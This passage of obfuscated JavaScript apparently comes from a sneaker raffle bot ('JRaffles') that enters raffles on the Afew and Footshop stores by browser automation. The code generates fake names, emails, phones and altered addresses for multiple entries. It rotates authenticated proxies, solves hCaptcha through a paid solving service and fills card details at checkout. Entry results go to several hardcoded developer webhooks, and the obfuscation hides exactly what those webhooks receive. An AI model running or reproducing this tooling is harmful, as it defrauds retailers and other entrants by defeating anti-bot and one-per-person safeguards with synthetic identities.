                                        'value': '' + _0x202e3d['delay'],
                                        'inline': !![]
                                    })['setTimestamp']()['setFooter']({
                                        'text': 'JRaffles\x20v' + _0x49eea2,
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                    });
                                    return _0x39a5a0['data'];
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
async function _0x2a3946(_0x44523f, _0x3a13ca) {
    var _0x208335 = _0x44523f[_0x3a13ca]['Address1']['split'](''), _0x17e0f2 = _0x44523f[_0x3a13ca]['Address2']['split'](''), _0x3d60f1 = _0x44523f[_0x3a13ca]['Email']['split']('@');
    for (var _0x3475c4 = 0x0; _0x3475c4 < _0x208335['length']; _0x3475c4++) {
        if (_0x208335[_0x3475c4] == 'X') {
            var _0xb7f7b = Math['round'](Math['random']() * (_0x435502['length'] - 0x1));
            _0x208335[_0x3475c4] = _0x313d1f[_0xb7f7b];
        }
    }
    ;
    for (var _0x3475c4 = 0x0; _0x3475c4 < _0x17e0f2['length']; _0x3475c4++) {
        if (_0x17e0f2[_0x3475c4] == 'X') {
            var _0xb7f7b = Math['round'](Math['random']() * (_0x435502['length'] - 0x1));
            _0x17e0f2[_0x3475c4] = _0x313d1f[_0xb7f7b];
        }
    }
    ;
    _0x44523f[_0x3a13ca]['FirstName'] == 'RANDOM' && (_0x44523f[_0x3a13ca]['FirstName'] = _0x145f8e['first']());
    _0x44523f[_0x3a13ca]['LastName'] == 'RANDOM' && (_0x44523f[_0x3a13ca]['LastName'] = _0x145f8e['last']());
    _0x3d60f1[0x0] == 'RANDOM' ? _0x3d60f1[0x0] = '' + _0x145f8e['first']() + _0x145f8e['last']() + '@' : _0x3d60f1[0x0] = _0x3d60f1[0x0] + '@';
    _0x44523f[_0x3a13ca]['Email'] = _0x3d60f1['join'](''), _0x44523f[_0x3a13ca]['Address1'] = _0x208335['join'](''), _0x44523f[_0x3a13ca]['Address2'] = _0x17e0f2['join']('');
    _0x44523f[_0x3a13ca]['Phone'] == 'RANDOM' && (_0x44523f[_0x3a13ca]['Phone'] = '0' + _0x165739(0x5f5e100, 0x3b9ac9ff));
    if (_0x44523f[_0x3a13ca]['Follower'] == 'RANDOM') {
        var _0x2ea7be = _0x165739(0x1, 0x270f);
        _0x44523f[_0x3a13ca]['Follower'] = '' + _0x145f8e['first']() + _0x145f8e['last']() + _0x2ea7be + '\x20';
    }
    _0x44523f[_0x3a13ca]['HouseNumber'] == 'RANDOM' && (_0x44523f[_0x3a13ca]['HouseNumber'] = _0x165739(0x1, 0xc8));
    if (_0x44523f[_0x3a13ca]['Address1'] == 'RANDOM') {
        var _0x391201 = Math['round'](Math['random']() * (_0x435502['length'] - 0x1)), _0x24d190 = _0x313d1f[_0x391201];
        _0x44523f[_0x3a13ca]['Address1'] = _0x145f8e['last']() + 'straat', _0x44523f[_0x3a13ca]['Zip'] == '' && (_0x44523f[_0x3a13ca]['Postcode'] = _0x165739(0x3e8, 0x270f) + '\x20' + _0x24d190 + _0x24d190, _0x44523f[_0x3a13ca]['Zip'] = _0x44523f[_0x3a13ca]['Postcode']), _0x44523f[_0x3a13ca]['HouseNumber'] = '' + _0x165739(0x1, 0xc8);
    }
    return;
}
;
function _0x52bbf1() {
    let _0x4bbe36 = proxyFile['split']('\x0a'), _0x5d3a77 = _0x4bbe36['map']((_0x1d3fc0, _0x5c6ad9) => {
        sanatizeProxy = _0x1d3fc0['replace']('\x0d', '');
        if (_0x4bbe36[_0x5c6ad9 + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x5d3a77;
}
;
async function _0x4b58a2(_0x44488b) {
    var _0x9bd1ce = _0x44488b[0x1]['split'](':');
    const _0x4f37fe = await _0x3d4a9f['launch']({
        'headless': !![],
        'args': ['--proxy-server=' + _0x9bd1ce[0x0] + ':' + _0x9bd1ce[0x1] + ',--no-sandbox\x27,\x0a\x20\x20\x20\x20\x20\x20\x27--disable-setuid-sandbox,--force-device-scale-factor=0.3']
    });
    try {
        const _0x33e136 = await _0x4f37fe['newPage']();
        await _0x33e136['authenticate']({
            'username': '' + _0x9bd1ce[0x2],
            'password': '' + _0x9bd1ce[0x3]
        }), console['log'](_0x3a3ee9() + '\x20[' + _0x1b0085[taskModule]['name'] + ']\x20Afew\x20Scraper\x20started'), await _0x33e136['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x33e136['setRequestInterception'](!![]), _0x33e136['on']('request', _0x40a9a5 => {
            _0x40a9a5['resourceType']() === 'image' || _0x40a9a5['resourceType']() === 'font' || _0x40a9a5['resourceType']() === 'media' ? _0x40a9a5['abort']() : _0x40a9a5['continue']();
        }), await _0x33e136['goto']('https://en.afew-store.com/collections/sneaker-raffles'), console['log'](_0x3a3ee9() + '\x20[' + _0x1b0085[taskModule]['name'] + ']\x20Looking\x20for\x20Raffles'), await _0x33e136['waitForTimeout'](0xbb8), await _0x33e136['waitForSelector']('.product-card');
        const _0x24fed8 = await _0x33e136['$$eval']('a.product-card', _0x5f48cd => {
            return _0x5f48cd['map'](_0x316ebb => _0x316ebb['href']);
        });
        return _0x18b0e6 = _0x24fed8;
    } catch (_0x119274) {
        console['log']('\x20' + _0x119274);
    } finally {
        _0x4f37fe['close'](), console['clear']();
    }
}
;
async function _0x1bfb71(_0x5398d8, _0x59767c, _0xa3f7ef, _0x5237b3, _0x3a56fb) {
    _0x59767c != 'ver' && await _0x2a3946(_0x5237b3, _0x5398d8);
    if (_0x202e3d['useRandomProxy'] = ![])
        var _0x5655cd = _0x3a56fb[_0x5398d8]['split'](':');
    else
        var _0x1cde0b = Math['round'](Math['random']() * (_0x3a56fb['length'] - 0x1)), _0x5655cd = _0x3a56fb[_0x1cde0b]['split'](':');
    var _0x2a2c86 = _0xa3f7ef['data'];
    _0x59767c != 'ver' && (_0x2a2c86['data']['attributes']['properties']['$first_name'] = '' + _0x5237b3[_0x5398d8]['FirstName'], _0x2a2c86['data']['attributes']['properties']['$last_name'] = '' + _0x5237b3[_0x5398d8]['LastName'], _0x2a2c86['data']['attributes']['properties']['$address1'] = _0x5237b3[_0x5398d8]['Address1'] + '\x20' + _0x5237b3[_0x5398d8]['HouseNumber'] + '\x20' + _0x5237b3[_0x5398d8]['Address2'], _0x2a2c86['data']['attributes']['properties']['$zip'] = '' + _0x5237b3[_0x5398d8]['Zip'], _0x2a2c86['data']['attributes']['properties']['$city'] = '' + _0x5237b3[_0x5398d8]['City'], _0x2a2c86['data']['attributes']['properties']['$country'] = '' + _0x5237b3[_0x5398d8]['Country'], _0x2a2c86['data']['attributes']['properties']['Size'] = '' + _0x5237b3[_0x5398d8]['Size'], _0x2a2c86['data']['attributes']['properties']['Instagram\x20Handle'] = '' + _0x5237b3[_0x5398d8]['Follower'], _0x59767c == 'exp' ? _0x2a2c86['data']['attributes']['email'] = '' + _0x5237b3[_0x5398d8]['FirstName'] + _0x5237b3[_0x5398d8]['LastName'] + _0x202e3d['catchall'] : _0x2a2c86['data']['attributes']['email'] = '' + _0x5237b3[_0x5398d8]['Email']);
    var _0x3dfd45 = {
        'jar': _0x3850c3,
        'followAllRedirects': !![],
        'method': 'POST',
        'url': _0xa3f7ef['url'],
        'headers': _0xa3f7ef['headers'],
        'body': JSON['stringify'](_0x2a2c86),
        'proxy': 'http://' + _0x5655cd[0x2] + ':' + _0x5655cd[0x3] + '@' + _0x5655cd[0x0] + ':' + _0x5655cd[0x1]
    };
    return _0x59767c === 'ver' && (_0x3dfd45['method'] = 'GET'), new Promise(function (_0x3e82c5, _0x4f60d1) {
        callback = async (_0x58cfb5, _0x24958c, _0x5ed526) => {
            if (!_0x58cfb5 && _0x24958c['statusCode'] == 0xca || !_0x58cfb5 && _0x24958c['statusCode'] == 0xc8) {
                _0x3e82c5(console['log'](_0xeca352['green'](_0x3a3ee9() + '\x20[' + _0xa3f7ef['name'] + ']\x20Task\x20' + (_0x5398d8 + 0x1) + ':\x20Raffle\x20Entered!')));
                if (_0x59767c != 'ver') {
                    var _0x4d1ada = await _0x2221dc(_0x5237b3[_0x5398d8], _0xa3f7ef, 'dev', ![]), _0x50bb94 = await _0x2221dc(_0x5237b3[_0x5398d8], _0xa3f7ef, 'pub', ![]);
                    const _0x5e31de = {
                        'succesDEVMSG': { 'embeds': [_0x4d1ada] },
                        'succesPUBMSG': { 'embeds': [_0x50bb94] }
                    };
                    if (_0x202e3d['webhook'] != undefined && _0x202e3d['webhook'] != '')
                        try {
                            await _0x10557a(_0x202e3d['webhook'], _0x5e31de['succesDEVMSG']);
                        } catch {
                        }
                    await _0x1f4682(0xc8), await _0x10557a(_0x16dc96, _0x5e31de['succesDEVMSG']), await _0x1f4682(0xc8);
                    try {
                        await _0x10557a(_0x146b83, _0x5e31de['succesPUBMSG']);
                    } catch {
                    }
                } else {
                    if (_0x59767c == 'ver') {
                        var _0x4d1ada = await _0x2221dc(null, _0xa3f7ef, 'ver', ![]);
                        const _0x53c970 = {
                            'succesDEVMSG': { 'embeds': [_0x4d1ada] },
                            'succesPUBMSG': { 'embeds': [_0x50bb94] }
                        };
                        await _0x10557a(_0x31745a, _0x53c970['succesDEVMSG']);
                    }
                }
            } else {
                if (_0x59767c != 'ver') {
                    var _0xd9d70a = '' + _0x58cfb5, _0x16ce40 = await _0x2221dc(_0x5237b3[_0x5398d8], _0xa3f7ef, 'dev', !![], _0xd9d70a), _0x3b8b88 = {};
                    _0x3b8b88['errorDEV'] = { 'embeds': [_0x16ce40] }, _0x202e3d['webhook'] != undefined && _0x202e3d['webhook'] != '' && await _0x10557a(_0x202e3d['webhook'], _0x3b8b88['errorDEV']), await _0x10557a(_0x3df8e6, _0x3b8b88['errorDEV']);
                }
                _0x4f60d1(console['log'](_0x3a3ee9() + '\x20[' + _0xa3f7ef['name'] + ']\x20Task\x20' + (_0x5398d8 + 0x1) + ':\x20' + _0x58cfb5));
            }
        };
        try {
            _0x59767c === 'ver' ? console['log'](_0x3a3ee9() + '\x20[' + _0xa3f7ef['name'] + ']\x20Task\x20' + (_0x5398d8 + 0x1) + ':\x20Verifying.') : console['log'](_0x3a3ee9() + '\x20[' + _0xa3f7ef['name'] + ']\x20Task\x20' + (_0x5398d8 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x2a2c86['data']['attributes']['email']), _0x1b3ad6(_0x3dfd45, callback);
        } catch (_0x42c821) {
            console['log'](_0x3a3ee9() + '\x20Task\x20' + (_0x5398d8 + 0x1) + ':\x20' + _0x42c821);
        }
    });
}
;
async function _0x29d527(_0x2f8c4b, _0x4ef272, _0x55777a) {
    _0x3d4a9f['use'](_0x42d8ce()), _0x3d4a9f['use'](_0x484dec({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x202e3d['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x2a2595 = 0x0; _0x2a2595 < _0x2f8c4b['length']; _0x2a2595++) {
        var _0x48a026, _0x57f543 = '', _0x57e4bd = 0x0, _0x27ef9a = [{
            'type': 'rich',
            'title': 'Succesful\x20Footshop\x20entry',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x1b651e
                },
                {
                    'name': 'Product',
                    'value': '' + _0x2f8c4b[_0x2a2595]['Url']
                },
                {
                    'name': 'Size',
                    'value': '' + _0x2f8c4b[_0x2a2595]['Size']
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x202e3d['footshopDelay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x49eea2
                }
            ]
        }], _0x493b0d = await _0x2221dc(_0x2f8c4b[_0x2a2595], _0x55777a, 'dev', ![]), _0x564fc3 = await _0x2221dc(_0x2f8c4b[_0x2a2595], _0x55777a, 'pub', ![]);
        const _0x2a6643 = {
            'succesDEVMSG': { 'embeds': [_0x493b0d] },
            'succesPUBMSG': { 'embeds': [_0x564fc3] }
        }, _0xd3f483 = { 'embeds': _0x27ef9a };
        await _0x2a3946(_0x2f8c4b, _0x2a2595);
        if (_0x2f8c4b[_0x2a2595]['Email'] == '' || _0x2f8c4b[_0x2a2595]['FirstName'] == '' || _0x2f8c4b[_0x2a2595]['LastName'] == '' || _0x2f8c4b[_0x2a2595]['Country'] == '' || _0x2f8c4b[_0x2a2595]['Size'] == '' || _0x2f8c4b[_0x2a2595]['Address1'] == '' || _0x2f8c4b[_0x2a2595]['Zip'] == '') {
            console['log'](_0x3a3ee9() + '\x20[' + _0x55777a['name'] + ']\x20Task\x20' + (_0x2a2595 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0x2f8c4b[_0x2a2595]['Email'] == '' || _0x2f8c4b[_0x2a2595]['FirstName'] == '' || _0x2f8c4b[_0x2a2595]['LastName'] == '' || _0x2f8c4b[_0x2a2595]['Country'] == '' || _0x2f8c4b[_0x2a2595]['Size'] == '' || _0x2f8c4b[_0x2a2595]['Address1'] == '' || _0x2f8c4b[_0x2a2595]['Zip'] == '' || _0x2f8c4b[_0x2a2595]['Phone'] == '') {
            console['log'](_0x3a3ee9() + '\x20[' + _0x55777a['name'] + ']\x20Task\x20' + (_0x2a2595 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        const _0x3959f3 = '' + _0x2f8c4b[_0x2a2595]['Url'];
        if (_0x202e3d['useRandomProxy'] = ![])
            var _0x410cd6 = _0x4ef272[_0x2a2595]['split'](':');
        else
            var _0x2d425a = Math['round'](Math['random']() * (_0x4ef272['length'] - 0x1)), _0x410cd6 = _0x4ef272[_0x2d425a]['split'](':');
        const _0x4589f7 = await _0x3d4a9f['launch']({
            'headless': !![],
            'args': ['--proxy-server=' + _0x410cd6[0x0] + ':' + _0x410cd6[0x1]]
        });
        try {
            const _0x457f2f = await _0x4589f7['newPage']();
            await _0x457f2f['authenticate']({
                'username': '' + _0x410cd6[0x2],
                'password': '' + _0x410cd6[0x3]
            }), console['log'](_0x3a3ee9() + '\x20[' + _0x55777a['name'] + ']\x20Task\x20' + (_0x2a2595 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x457f2f['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x457f2f['setRequestInterception'](!![]), _0x457f2f['on']('request', _0x472d67 => {
                _0x472d67['resourceType']() === 'image' || _0x472d67['resourceType']() === 'font' || _0x472d67['resourceType']() === 'media' ? _0x472d67['abort']() : _0x472d67['continue']();
            }), await _0x457f2f['goto'](_0x3959f3), await _0x1f4682(0xbb8), await _0x457f2f['waitForSelector']('.control__JhutY'), await _0x457f2f['click']('.control__JhutY'), await _0x1f4682(0x1f4);
            if (_0x2f8c4b[_0x2a2595]['Size'] != 'RANDOM')
                try {
                    const _0xa3fd50 = await _0x457f2f['$x']('//div[contains(text(),\x20\x27' + _0x2f8c4b[_0x2a2595]['Size'] + '\x27)]');
                    await _0xa3fd50[0x0]['click']();
                } catch {
                    console['log'](_0xeca352['red'](_0x3a3ee9() + '\x20[' + _0x55777a['name'] + ']\x20Task\x20' + (_0x2a2595 + 0x1) + '\x20:\x20Size\x20Not\x20Found'));
                    continue;
                }
            else {
                const _0x3375af = await _0x457f2f['$$']('.options__3UQpT\x20>\x20div.row');
                var _0x1daa7a = Math['round'](Math['random']() * (_0x3375af['length'] - 0x1));
                await _0x3375af[_0x1daa7a]['click']();
            }
            await _0x1f4682(0x4b0);
            const _0x3bf83f = await _0x457f2f['$x']('//span[contains(text(),\x20\x27Enter\x20raffle\x20now\x27)]');
            await _0x3bf83f[0x0]['click'](), await _0x457f2f['waitForSelector']('input[name=\x22email\x22]'), console['log'](_0x3a3ee9() + '\x20[' + _0x55777a['name'] + ']\x20Task\x20' + (_0x2a2595 + 0x1) + '\x20:\x20Filling\x20Entry\x20Credentials'), await _0x457f2f['type']('input[name=\x22email\x22]', '' + _0x2f8c4b[_0x2a2595]['Email']), await _0x1f4682(0x640), await _0x457f2f['type']('input[name=\x22phone\x22]', '' + _0x2f8c4b[_0x2a2595]['Phone']), await _0x1f4682(0x4b0), await _0x457f2f['click']('button.btn.continue-button__1RtsS'), await _0x1f4682(0x4b0);
            try {
                await _0x457f2f['type']('input[name=\x22firstName\x22]', '' + _0x2f8c4b[_0x2a2595]['FirstName']), await _0x1f4682(0x258);
            } catch {
                const _0x5541fe = await _0x457f2f['$$eval']('.invalid-feedback\x20>\x20div', _0x59a80c => {
                    return _0x59a80c['map'](_0x2f5681 => _0x2f5681['innerText']);
                });
                console['log'](_0xeca352['red'](_0x3a3ee9() + '\x20[' + _0x55777a['name'] + ']\x20Task\x20' + (_0x2a2595 + 0x1) + '\x20:\x20' + _0x5541fe));
                continue;
            }
            await _0x457f2f['type']('input[name=\x22lastName\x22]', '' + _0x2f8c4b[_0x2a2595]['LastName']), await _0x1f4682(0xc8), await _0x457f2f['type']('input[name=\x22instagramUsername\x22]', '' + _0x2f8c4b[_0x2a2595]['Follower']), await _0x1f4682(0x4b0), await _0x457f2f['click']('button.btn.continue-button__1RtsS'), await _0x1f4682(0x3e8), console['log'](_0x3a3ee9() + '\x20[' + _0x55777a['name'] + ']\x20Task\x20' + (_0x2a2595 + 0x1) + '\x20:\x20Filling\x20Shipping'), await _0x457f2f['select']('select[name=\x22country\x22]', '' + _0x2f8c4b[_0x2a2595]['Country']), await _0x1f4682(0x2bc), await _0x457f2f['type']('input[name=\x22streetName\x22]', '' + _0x2f8c4b[_0x2a2595]['Address1']), await _0x1f4682(0x258), await _0x457f2f['type']('input[name=\x22houseNumber\x22]', _0x2f8c4b[_0x2a2595]['HouseNumber'] + '\x20' + _0x2f8c4b[_0x2a2595]['Address2']), await _0x1f4682(0xc8), await _0x457f2f['type']('input[name=\x22postalCode\x22]', '' + _0x2f8c4b[_0x2a2595]['Zip']), await _0x1f4682(0x1f4), await _0x457f2f['type']('input[name=\x22city\x22]', '' + _0x2f8c4b[_0x2a2595]['City']), await _0x1f4682(0x4b0), await _0x457f2f['click']('input[name=\x22consent::privacy-policy-101\x22]'), await _0x1f4682(0x4b0), await _0x457f2f['click']('button.btn.continue-button__1RtsS'), await _0x1f4682(0x4b0), console['log'](_0x3a3ee9() + '\x20[' + _0x55777a['name'] + ']\x20Task\x20' + (_0x2a2595 + 0x1) + '\x20:\x20Solving\x20hCaptcha'), await _0x457f2f['solveRecaptchas'](), console['log'](_0x3a3ee9() + '\x20[' + _0x55777a['name'] + ']\x20Task\x20' + (_0x2a2595 + 0x1) + '\x20:\x20hCaptcha\x20solved'), await _0x1f4682(0xbb8), await _0x457f2f['click']('button.btn.continue-button__1RtsS'), await _0x1f4682(0x1388), console['log'](_0x3a3ee9() + '\x20[' + _0x55777a['name'] + ']\x20Task\x20' + (_0x2a2595 + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0x457f2f['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x457f2f['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x1f4682(0x4b0), await _0x457f2f['type']('span[data-cse=\x22encryptedCardNumber\x22]', '' + _0x2f8c4b[_0x2a2595]['CardNumber']), await _0x1f4682(0x320), await _0x457f2f['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x457f2f['type']('span[data-cse=\x22encryptedExpiryDate\x22]', '' + _0x2f8c4b[_0x2a2595]['ExpiryDate']), await _0x1f4682(0x4b0), await _0x457f2f['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x457f2f['type']('span[data-cse=\x22encryptedSecurityCode\x22]', '' + _0x2f8c4b[_0x2a2595]['CVV']), await _0x1f4682(0x226), await _0x457f2f['type']('input[name=\x22holderName\x22]', '' + _0x2f8c4b[_0x2a2595]['NameOnCard']), await _0x1f4682(0x226), await _0x457f2f['click']('button.adyen-checkout__button'), console['log'](_0x3a3ee9() + '\x20[' + _0x55777a['name'] + ']\x20Task\x20' + (_0x2a2595 + 0x1) + '\x20:\x20Awaiting\x203DS');
            try {
                await _0x457f2f['waitForSelector']('.thank-you__1AwOo', { 'timeout': 0x493e0 }), await _0x1f4682(0xbb8);
            } catch (_0x2061c4) {
                console['log'](_0xeca352['red'](_0x3a3ee9() + '\x20[' + _0x55777a['name'] + ']\x20Task\x20' + (_0x2a2595 + 0x1) + '\x20:\x203DS\x20Failed')), _0x48a026 = '3DS\x20Error\x20' + _0x2061c4;
                var _0x5080b2 = await _0x2221dc(_0x2f8c4b[_0x2a2595], _0x55777a, 'dev', !![], _0x48a026);
                _0x2a6643['errorDEV'] = { 'embeds': [_0x5080b2] };
                _0x202e3d['webhook'] != undefined && _0x202e3d['webhook'] != '' && await _0x10557a(_0x202e3d['webhook'], _0x2a6643['errorDEV']);
                await _0x10557a(_0x3df8e6, _0x2a6643['errorDEV']);
                continue;
            }
            console['log'](_0xeca352['green'](_0x3a3ee9() + '\x20[' + _0x55777a['name'] + ']\x20Task\x20' + (_0x2a2595 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
            if (_0x202e3d['webhook'] != undefined && _0x202e3d['webhook'] != '')
                try {
                    await _0x10557a(_0x202e3d['webhook'], _0x2a6643['succesDEVMSG']);
                } catch {
                }
            await _0x1f4682(0xc8), await _0x10557a(_0x16dc96, _0x2a6643['succesDEVMSG']), await _0x1f4682(0xc8);
            try {
                await _0x10557a(_0x146b83, _0x2a6643['succesPUBMSG']);
            } catch {
            }
        } catch (_0x16b75a) {
            console['log'](_0x3a3ee9() + '\x20[' + _0x55777a['name'] + ']\x20Task\x20' + (_0x2a2595 + 0x1) + '\x20:\x20' + _0x16b75a), _0x48a026 = '' + _0x16b75a;
            var _0x5080b2 = await _0x2221dc(_0x2f8c4b[_0x2a2595], _0x55777a, 'dev', !![], _0x48a026);
            _0x2a6643['errorDEV'] = { 'embeds': [_0x5080b2] }, _0x202e3d['webhook'] != undefined && _0x202e3d['webhook'] != '' && await _0x10557a(_0x202e3d['webhook'], _0x2a6643['errorDEV']), await _0x10557a(_0x3df8e6, _0x2a6643['errorDEV']), _0x57f543 = 'yes';
        } finally {
            _0x4589f7['close']();
            if (_0x57f543 == 'yes' && _0x57e4bd != 0x5) {
                console['log'](_0xeca352['red'](_0x3a3ee9() + '\x20[' + _0x55777a['name'] + ']\x20Task\x20' + (_0x2a2595 + 0x1) + '\x20:\x20Retrying')), _0x2a2595 = _0x2a2595 - 0x1, _0x57e4bd = _0x57e4bd + 0x1;
                continue;
            }
            console['log']('Waiting\x20for\x20' + _0x202e3d['footshopDelay'] + '\x20ms'), await _0x1f4682(_0x202e3d['footshopDelay']);
        }
    }
}
afewFunction = async (_0x43038e, _0x848da3, _0xca2bd8, _0x3aa90f, _0x50a4de) => {
    for (var _0x5455cd = 0x0; _0x5455cd < _0x3aa90f['length']; _0x5455cd++) {
        _0x202e3d['AfewDelay'] = _0x202e3d['delay'];
        var _0x2c7dd8, _0x2f4879 = '', _0xd91b9f = 0x0;
        _0x3aa90f[_0x5455cd]['Url'] = _0x43038e, _0x4dc5fe(_0xca2bd8['name'] + '\x20Task\x20' + (_0x5455cd + 0x1) + '\x20/\x20' + _0x3aa90f['length'] + '\x20||\x20File:\x20' + _0x3733f2 + '\x20Proxies:\x20' + _0xc68ec8), await _0x2a3946(_0x3aa90f, _0x5455cd);
        var _0x542028 = await _0x2221dc(_0x3aa90f[_0x5455cd], _0xca2bd8, 'dev', ![]), _0x4a6a94 = await _0x2221dc(_0x3aa90f[_0x5455cd], _0xca2bd8, 'pub', ![]);
        const _0x5e8bc3 = {
            'succesDEVMSG': { 'embeds': [_0x542028] },
            'succesPUBMSG': { 'embeds': [_0x4a6a94] }
        };
        if (_0x3aa90f[_0x5455cd]['Email'] == '' || _0x3aa90f[_0x5455cd]['FirstName'] == '' || _0x3aa90f[_0x5455cd]['LastName'] == '' || _0x3aa90f[_0x5455cd]['Country'] == '' || _0x3aa90f[_0x5455cd]['Size'] == '' || _0x3aa90f[_0x5455cd]['Address1'] == '' || _0x3aa90f[_0x5455cd]['Zip'] == '') {
            console['log'](_0x3a3ee9() + '\x20[' + _0xca2bd8['name'] + ']\x20Task\x20' + (_0x5455cd + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0x202e3d['useRandomProxy'] = ![])
            var _0x217f9e = _0x50a4de[_0x5455cd]['split'](':');
        else
            var _0xe9485d = Math['round'](Math['random']() * (_0x50a4de['length'] - 0x1)), _0x217f9e = _0x50a4de[_0xe9485d]['split'](':');
        const _0x443064 = await _0x3d4a9f['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x217f9e[0x0] + ':' + _0x217f9e[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x56bd20 = await _0x443064['newPage']();
            await _0x56bd20['setDefaultNavigationTimeout'](0x1d4c0), await _0x56bd20['authenticate']({
                'username': '' + _0x217f9e[0x2],
                'password': '' + _0x217f9e[0x3]
            }), console['log'](_0x3a3ee9() + '\x20[' + _0xca2bd8['name'] + ']\x20Task\x20' + (_0x5455cd + 0x1) + '\x20:\x20Getting\x20Session'), await _0x56bd20['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x56bd20['setRequestInterception'](!![]), _0x56bd20['on']('request', _0x10f8af => {
                _0x10f8af['resourceType']() === 'image' || _0x10f8af['resourceType']() === 'font' || _0x10f8af['resourceType']() === 'media' ? _0x10f8af['abort']() : _0x10f8af['continue']();
            }), await _0x56bd20['goto'](_0x43038e, { 'waitUntil': 'networkidle2' }), console['log'](_0x3a3ee9() + '\x20[' + _0xca2bd8['name'] + ']\x20Task\x20' + (_0x5455cd + 0x1) + '\x20:\x20Gathering\x20cookies'), await _0x56bd20['waitForTimeout'](0xfa0), console['log'](_0x3a3ee9() + '\x20[' + _0xca2bd8['name'] + ']\x20Task\x20' + (_0x5455cd + 0x1) + '\x20:\x20Cookies\x20received'), await _0x56bd20['waitForTimeout'](0x320);
            if (_0x3aa90f[_0x5455cd]['Size'] == 'RANDOM') {
                console['log'](_0x3a3ee9() + '\x20[' + _0xca2bd8['name'] + ']\x20Task\x20' + (_0x5455cd + 0x1) + '\x20:\x20Choosing\x20random\x20size');
                const _0x4a4b2f = await _0x56bd20['$$eval']('div.size-picker.mt-2\x20>\x20ul\x20>\x20li\x20>\x20a', _0x10ca9e => {
                    return _0x10ca9e['map'](_0x2ef4a5 => _0x2ef4a5['href']);
                });
                var _0x493156 = Math['round'](Math['random']() * (_0x4a4b2f['length'] - 0x1));
                await _0x56bd20['goto']('' + _0x4a4b2f[_0x493156]);
            } else {
                console['log'](_0x3a3ee9() + '\x20[' + _0xca2bd8['name'] + ']\x20Task\x20' + (_0x5455cd + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x3aa90f[_0x5455cd]['Size']);
                try {
                    const _0x43badd = await _0x56bd20['$$eval']('li[data-original-title=\x22Größe\x20in\x20EU:\x20' + _0x3aa90f[_0x5455cd]['Size'] + '\x22]\x20>\x20a', _0x198567 => {
                        return _0x198567['map'](_0x344e4a => _0x344e4a['href']);
                    });
                    await _0x56bd20['goto']('' + _0x43badd[0x0], { 'waitUntil': 'networkidle2' });
                } catch (_0x595f34) {
                    console['log'](_0xeca352['red'](_0x3a3ee9() + '\x20[' + _0xca2bd8['name'] + ']\x20Task\x20' + (_0x5455cd + 0x1) + '\x20:\x20' + _0x595f34 + '\x20Size\x20not\x20found')), _0x2c7dd8 = 'Size\x20Not\x20Found';
                    var _0x20be82 = await _0x2221dc(_0x3aa90f[_0x5455cd], _0xca2bd8, 'dev', !![], _0x2c7dd8);
                    _0x5e8bc3['errorDEV'] = { 'embeds': [_0x20be82] };
                    _0x202e3d['webhook'] != undefined && _0x202e3d['webhook'] != '' && await _0x10557a(_0x202e3d['webhook'], _0x5e8bc3['errorDEV']);
                    await _0x10557a(_0x3df8e6, _0x5e8bc3['errorDEV']);
                    continue;
                }
            }
            await _0x56bd20['waitForTimeout'](0x258), await _0x56bd20['type']('#raffle-instagram', '' + _0x3aa90f[_0x5455cd]['Follower'], { 'delay': 0x64 }), await _0x56bd20['waitForTimeout'](0x384), await _0x56bd20['click']('#raffle-terms'), await _0x56bd20['waitForTimeout'](0x384), await _0x56bd20['evaluate'](() => {
                const _0x28480 = document['querySelector']('button.btn[name=\x27add\x27]');
                _0x28480['click']();
            }), await _0x56bd20['waitForTimeout'](0xbb8), await _0x56bd20['waitForSelector']('#checkout_email'), await _0x1f4682(0x3e8), console['log'](_0x3a3ee9() + '\x20[' + _0xca2bd8['name'] + ']\x20Task\x20' + (_0x5455cd + 0x1) + '\x20:\x20Filling\x20Information');
            _0x848da3 == 'sec' ? await _0x56bd20['type']('#checkout_email', '' + _0x3aa90f[_0x5455cd]['FirstName'] + _0x3aa90f[_0x5455cd]['LastName'] + _0x202e3d['catchall'], 0x32) : await _0x56bd20['type']('#checkout_email', '' + _0x3aa90f[_0x5455cd]['Email'], 0x32);
